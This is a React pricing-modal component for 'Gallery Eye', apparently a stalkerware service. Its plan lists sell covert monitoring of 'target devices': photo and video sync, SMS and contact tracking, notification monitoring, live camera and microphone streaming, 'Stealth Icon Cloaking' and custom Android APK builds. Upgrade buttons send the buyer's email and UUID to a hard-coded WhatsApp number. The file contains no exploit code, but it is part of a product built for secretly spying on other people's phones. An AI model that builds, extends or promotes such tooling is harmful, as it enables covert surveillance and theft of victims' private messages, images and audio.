"use client";

import React from 'react';
import { 
    Check, X, Shield, Zap, Crown, Building2, 
    ArrowRight, Smartphone, MessageSquare, 
    Bell, Camera, Mic, EyeOff, Download, Radio, Sparkles
} from 'lucide-react';

interface PlansModalProps {
    isOpen: boolean;
    onClose: () => void;
    currentPlan: 'basic' | 'standard' | 'premium' | 'enterprise';
    userEmail: string;
    userUuid: string;
}

export default function PlansModal({ isOpen, onClose, currentPlan, userEmail, userUuid }: PlansModalProps) {
    if (!isOpen) return null;

    const getWhatsAppLink = (planName: string, price: string) => {
        const msg = `🔐 *Gallery Eye — Plan Upgrade*\n\n📧 Email: ${userEmail}\n🆔 UUID: ${userUuid}\n📋 Plan: ${planName} (${price})\n\nI'd like to upgrade to the ${planName} plan. Please process my request! 🙏✨`;
        return `https://wa.me/923460257488?text=${encodeURIComponent(msg)}`;
    };

    const plans = [
        {
            id: 'basic',
            name: 'Free Starter',
            price: '$0',
            period: 'FOREVER',
            theme: 'slate',
            accent: '#94a3b8',
            glowColor: 'rgba(148,163,184,0.2)',
            icon: Shield,
            badge: null,
            features: [
                { icon: Camera, text: '50 Photos Sync Limit', included: true },
                { icon: Smartphone, text: '1 Target Device', included: true },
                { icon: Download, text: 'Basic Gallery Viewer', included: true },
                { icon: Radio, text: 'Live Video Sync', included: false },
                { icon: MessageSquare, text: 'SMS & Contacts Tracker', included: false },
                { icon: Bell, text: 'Notification Monitor', included: false },
                { icon: Mic, text: 'Camera & Mic Stream', included: false },
                { icon: EyeOff, text: 'Stealth Icon Cloaking', included: false },
            ],
        },
        {
            id: 'standard',
            name: 'Standard Pro',
            price: '$5',
            period: '/ YEAR',
            theme: 'emerald',
            accent: '#10b981',
            glowColor: 'rgba(16,185,129,0.3)',
            icon: Zap,
            badge: 'POPULAR CHOICE',
            badgeClass: 'clay-pill-emerald text-emerald-300',
            features: [
                { icon: Camera, text: 'Unlimited Photos & Videos', included: true },
                { icon: Smartphone, text: 'Up to 5 Target Devices', included: true },
                { icon: MessageSquare, text: 'SMS & Contacts Sync', included: true },
                { icon: Bell, text: 'Notification Monitor', included: true },
                { icon: Radio, text: 'Torch & Vibration Pulse', included: true },
                { icon: Download, text: 'ZIP Bulk Downloader', included: true },
                { icon: Mic, text: 'Camera & Mic Stream', included: false },
                { icon: EyeOff, text: 'Stealth Icon Cloaking', included: false },
            ],
        },
        {
            id: 'premium',
            name: 'Premium Elite',
            price: '$10',
            period: '/ YEAR',
            theme: 'amber',
            accent: '#f59e0b',
            glowColor: 'rgba(245,158,11,0.35)',
            icon: Crown,
            badge: 'ALL ACCESS VIP',
            badgeClass: 'clay-pill-amber text-amber-300',
            features: [
                { icon: Radio, text: 'Everything in Standard', included: true },
                { icon: Smartphone, text: 'Up to 10 Target Devices', included: true },
                { icon: Camera, text: 'Live Camera Streaming', included: true },
                { icon: Mic, text: 'Live Mic Audio Stream', included: true },
                { icon: EyeOff, text: 'Stealth Icon Cloaking', included: true },
                { icon: Download, text: 'All Tools & Actions Unlocked', included: true },
                { icon: Sparkles, text: 'Instant Telemetry Sync', included: true },
                { icon: Shield, text: 'Priority WhatsApp VIP Desk', included: true },
            ],
        },
        {
            id: 'enterprise',
            name: 'Enterprise VIP',
            price: 'Custom',
            period: 'CUSTOM SLA',
            theme: 'purple',
            accent: '#a855f7',
            glowColor: 'rgba(168,85,247,0.4)',
            icon: Building2,
            badge: 'UNLIMITED POD',
            badgeClass: 'clay-capsule text-purple-300 border-purple-500/50 bg-gradient-to-r from-purple-900/40 to-indigo-900/40 shadow-[0_0_20px_rgba(168,85,247,0.4)]',
            features: [
                { icon: Sparkles, text: 'Everything in Premium', included: true },
                { icon: Smartphone, text: 'Unlimited Target Devices', included: true },
                { icon: Radio, text: 'Maximum Bandwidth & Speed', included: true },
                { icon: Download, text: 'Unlimited Cloud Storage', included: true },
                { icon: Shield, text: 'Custom Domain / Whitelabel', included: true },
                { icon: Mic, text: 'Full Audio & Video Suite', included: true },
                { icon: Crown, text: '24/7 Dedicated Support', included: true },
                { icon: EyeOff, text: 'Custom Android APK Builds', included: true },
            ],
        },
    ];

    return (
        <div 
            className="fixed inset-0 z-[600] flex items-center justify-center p-3 sm:p-5 bg-black/85 backdrop-blur-xl animate-in fade-in duration-100"
            onClick={onClose}
        >
            <div 
                className="clay-card relative w-full max-w-6xl p-4 sm:p-6 sm:pt-7 rounded-[2.5rem] border border-white/10 shadow-[0_30px_100px_rgba(0,0,0,0.98)] max-h-[92vh] flex flex-col overflow-hidden animate-in zoom-in-95 duration-100"
                onClick={(e) => e.stopPropagation()}
            >
                {/* Minimal Floating Close Button */}
                <button
                    type="button"
                    onClick={onClose}
                    className="clay-button-sm absolute top-4 right-4 sm:top-5 sm:right-5 w-9 h-9 rounded-xl flex items-center justify-center text-white/70 hover:text-white transition-all cursor-pointer z-20"
                    title="Close Modal"
                >
                    <X size={16} />
                </button>

                {/* Scrollable Plans Matrix (4 3D Clay Columns) */}
                <div className="overflow-y-auto pr-1 custom-scrollbar pt-2 sm:pt-1 pb-1">
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 sm:gap-4">
                        {plans.map((plan) => {
                            const isActive = currentPlan === plan.id;
                            const isPremium = plan.id === 'premium';
                            const isEnterprise = plan.id === 'enterprise';
                            const isStandard = plan.id === 'standard';
                            const IconComponent = plan.icon;

                            const canUpgrade = !isActive && (
                                (plan.id === 'standard' && currentPlan === 'basic') ||
                                (plan.id === 'premium' && (currentPlan === 'basic' || currentPlan === 'standard')) ||
                                (plan.id === 'enterprise' && (currentPlan === 'basic' || currentPlan === 'standard' || currentPlan === 'premium'))
                            );

                            return (
                                <div
                                    key={plan.id}
                                    className={`clay-card p-4 sm:p-5 rounded-[2rem] border relative overflow-hidden flex flex-col justify-between group hover:-translate-y-1 transition-all duration-300 shadow-[0_20px_50px_rgba(0,0,0,0.85)] ${
                                        isActive
                                            ? 'border-orange-500/80 shadow-[0_0_30px_rgba(249,115,22,0.25)]'
                                            : isEnterprise
                                                ? 'border-purple-500/40 hover:border-purple-500/70 shadow-[0_15px_40px_rgba(147,51,234,0.15)]'
                                                : isPremium
                                                    ? 'border-amber-500/40 hover:border-amber-500/70 shadow-[0_15px_40px_rgba(245,158,11,0.15)]'
                                                    : isStandard
                                                        ? 'border-emerald-500/40 hover:border-emerald-500/70 shadow-[0_15px_40px_rgba(16,185,129,0.15)]'
                                                        : 'border-white/10 hover:border-white/20'
                                    }`}
                                >
                                    {/* Floating 3D Pill Badge */}
                                    {plan.badge && (
                                        <div className="absolute -top-2.5 right-4 z-10">
                                            <span className={`px-3 py-0.5 rounded-full text-[9px] font-mono font-black uppercase tracking-wider shadow-md ${plan.badgeClass}`}>
                                                {plan.badge}
                                            </span>
                                        </div>
                                    )}

                                    <div>
                                        {/* Plan Icon Pod & Title */}
                                        <div className="flex items-center gap-3 mb-3.5 pt-1">
                                            <div 
                                                className="clay-icon-pod w-13 h-13 p-2.5 rounded-2xl flex items-center justify-center shrink-0 border"
                                                style={{
                                                    borderColor: `${plan.accent}40`,
                                                    color: plan.accent,
                                                    boxShadow: `0 0 20px ${plan.glowColor}`
                                                }}
                                            >
                                                <IconComponent size={22} />
                                            </div>
                                            <div className="min-w-0">
                                                <h3 className="text-sm sm:text-base font-black text-white truncate tracking-tight">{plan.name}</h3>
                                                <p className="text-[10px] font-mono font-bold text-white/40 uppercase tracking-wider">
                                                    Tier Profile
                                                </p>
                                            </div>
                                        </div>

                                        {/* 3D Inset Pricing Chamber */}
                                        <div className="clay-coords-badge p-3 rounded-2xl mb-3 flex items-center justify-between border-white/10">
                                            <div>
                                                <div className="text-[9px] font-mono font-black text-white/40 uppercase tracking-widest">Rate</div>
                                                <div className="text-xl sm:text-2xl font-black text-white font-mono tracking-tight">{plan.price}</div>
                                            </div>
                                            <div className="clay-capsule px-2.5 py-1 rounded-xl text-[9px] font-mono font-black text-orange-400 uppercase tracking-wider border-orange-500/30">
                                                {plan.period}
                                            </div>
                                        </div>

                                        {/* Active Status Pod */}
                                        {isActive && (
                                            <div className="clay-coords-badge mb-3 py-1.5 px-3 rounded-xl text-center text-[10px] font-mono font-black uppercase tracking-wider border-orange-500/60 text-orange-300 shadow-[0_0_15px_rgba(249,115,22,0.2)]">
                                                ● Currently Active
                                            </div>
                                        )}

                                        {/* 3D Tactile Feature List (Every Item is a 3D Capsule) */}
                                        <div className="space-y-1.5 mb-4">
                                            {plan.features.map((f, i) => {
                                                return (
                                                    <div 
                                                        key={i} 
                                                        className={`clay-capsule p-2 rounded-xl flex items-center gap-2.5 transition-colors ${
                                                            f.included ? 'hover:border-white/20' : 'opacity-40'
                                                        }`}
                                                    >
                                                        <div 
                                                            className={`w-5 h-5 rounded-lg flex items-center justify-center shrink-0 ${
                                                                f.included 
                                                                    ? 'clay-icon-pod text-emerald-400 border-emerald-500/40 bg-emerald-500/15' 
                                                                    : 'bg-black/40 border border-white/5 text-white/20'
                                                            }`}
                                                        >
                                                            {f.included ? <Check size={10} strokeWidth={3} /> : <X size={9} strokeWidth={2} />}
                                                        </div>
                                                        <span className={`text-[11px] font-mono font-bold leading-tight truncate ${
                                                            f.included ? 'text-zinc-200' : 'text-zinc-500 line-through'
                                                        }`}>
                                                            {f.text}
                                                        </span>
                                                    </div>
                                                );
                                            })}
                                        </div>
                                    </div>

                                    {/* Action Button (3D Clay CTA) */}
                                    <div className="pt-2">
                                        {canUpgrade ? (
                                            <a
                                                href={getWhatsAppLink(plan.name, `${plan.price} ${plan.period}`)}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                className={`clay-cta-button w-full py-3 rounded-xl font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer active:scale-95 ${
                                                    isEnterprise
                                                        ? 'bg-gradient-to-r from-purple-600 to-indigo-600 border-purple-400/50 shadow-[0_0_20px_rgba(168,85,247,0.4)]'
                                                        : isPremium
                                                            ? 'bg-gradient-to-r from-amber-500 to-yellow-500 text-black border-amber-300 shadow-[0_0_20px_rgba(245,158,11,0.4)] font-black'
                                                            : 'bg-gradient-to-r from-emerald-500 to-teal-500 text-black border-emerald-300 shadow-[0_0_20px_rgba(16,185,129,0.4)] font-black'
                                                }`}
                                            >
                                                <span>Upgrade Tier</span>
                                                <ArrowRight size={13} />
                                            </a>
                                        ) : isActive ? (
                                            <div className="clay-capsule py-2.5 rounded-xl text-center text-[10px] font-mono font-black uppercase tracking-wider text-white/40 border-white/5">
                                                Active Tier
                                            </div>
                                        ) : (
                                            <div className="clay-capsule py-2.5 rounded-xl text-center text-[10px] font-mono font-black uppercase tracking-wider text-white/30 border-white/5">
                                                Included in Tier
                                            </div>
                                        )}
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
}
